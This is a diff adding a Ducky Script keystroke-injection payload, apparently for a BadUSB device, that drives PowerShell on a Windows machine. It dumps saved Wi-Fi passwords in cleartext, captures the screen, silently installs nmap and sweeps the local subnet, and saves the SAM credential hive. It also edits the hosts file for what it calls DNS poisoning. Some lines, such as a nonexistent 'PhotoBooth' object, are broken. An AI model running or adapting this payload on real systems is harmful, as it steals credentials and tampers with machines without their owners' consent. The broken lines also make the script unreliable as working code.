@@ -1,0 +1,63 @@
+DELAY 1000
+REM Open the Run dialog
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+STRING powershell
+ENTER
+DELAY 500
+
+REM Get saved wireless keys
+STRING (netsh wlan show profiles) | Select-String '\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name='$name' key=clear)} | Select-String 'Key Content\W+\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-File $env:USERPROFILE\Desktop\savedwirelesskeys.txt
+DELAY 500
+ENTER
+DELAY 500 
+
+REM Screen capture
+STRING (New-Object -ComObject WScript.Shell).SendKeys('{PRTSC}')
+DELAY 500
+STRING (Add-Type -AssemblyName System.Windows.Forms; $clipboard = [System.Windows.Forms.Clipboard]::GetImage(); $clipboard.Save("$env:USERPROFILE\Desktop\screencapture.png"))
+DELAY 500
+ENTER
+DELAY 500
+ENTER
+STRING $photoBooth = New-Object PhotoBooth; $photoBooth.TakeSnapshot()
+DELAY 500
+ENTER
+
+REM Install Nmap
+STRING Start-BitsTransfer -Source "https://nmap.org/dist/nmap-7.92-setup.exe" -Destination "$env:USERPROFILE\Desktop\nmap-7.92-setup.exe"
+DELAY 500
+ENTER
+DELAY 5000
+STRING Start-Process -FilePath "$env:USERPROFILE\Desktop\nmap-7.92-setup.exe" -ArgumentList "/S" -Wait
+DELAY 1000
+
+REM Run Nmap scan
+STRING & "C:\Program Files (x86)\Nmap\nmap.exe" -sn 192.168.0.0/24 -oN $env:USERPROFILE\Desktop\nmap_scan_results.txt
+DELAY 500
+ENTER
+DELAY 2000
+
+REM SAM capture
+STRING reg save HKLM\SAM $env:USERPROFILE\Desktop\sam
+DELAY 500
+ENTER
+DELAY 1000
+
+REM Modify HOSTS file for DNS poisoning
+STRING Add-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Value '127.0.0.1 www.example.com'
+DELAY 500
+ENTER
+
+REM Collect ipconfig /all information
+STRING ipconfig /all > $env:USERPROFILE\Desktop\ipconfig_all.txt
+DELAY 500
+ENTER
+
+REM Close PowerShell
+STRING exit
+DELAY 300
+ENTER
